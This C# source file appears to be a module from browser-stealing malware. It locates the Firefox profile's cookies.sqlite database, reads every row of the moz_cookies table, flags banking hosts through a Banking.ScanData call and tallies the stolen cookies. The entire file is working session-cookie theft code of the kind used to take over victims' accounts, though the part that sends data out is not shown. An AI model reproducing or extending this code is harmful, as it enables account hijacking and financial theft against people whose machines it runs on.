using System;
using System.Collections.Generic;
using System.IO;
using Client.Modules.Passwords.Helpers;

namespace Client.Modules.Passwords.Targets.Browsers.Firefox;

internal sealed class cCookies
{
	private static string GetCookiesDBPath(string path)
	{
		try
		{
			string path2 = path + "\\Profiles";
			if (Directory.Exists(path2))
			{
				string[] directories = Directory.GetDirectories(path2);
				foreach (string text in directories)
				{
					if (File.Exists(text + "\\cookies.sqlite"))
					{
						return text + "\\cookies.sqlite";
					}
				}
			}
		}
		catch
		{
		}
		return null;
	}

	public static List<Cookie> Get(string path)
	{
		List<Cookie> list = new List<Cookie>();
		try
		{
			SQLite sQLite = SqlReader.ReadTable(GetCookiesDBPath(path), "moz_cookies");
			if (sQLite == null)
			{
				return list;
			}
			for (int i = 0; i < sQLite.GetRowCount(); i++)
			{
				Cookie item = default(Cookie);
				item.sHostKey = sQLite.GetValue(i, 4);
				item.sName = sQLite.GetValue(i, 2);
				item.sValue = sQLite.GetValue(i, 3);
				item.sPath = sQLite.GetValue(i, 5);
				item.sExpiresUtc = sQLite.GetValue(i, 6);
				Banking.ScanData(item.sHostKey);
				Counter.Cookies++;
				list.Add(item);
			}
			return list;
		}
		catch (Exception value)
		{
			Console.WriteLine(value);
		}
		return new List<Cookie>();
	}
}
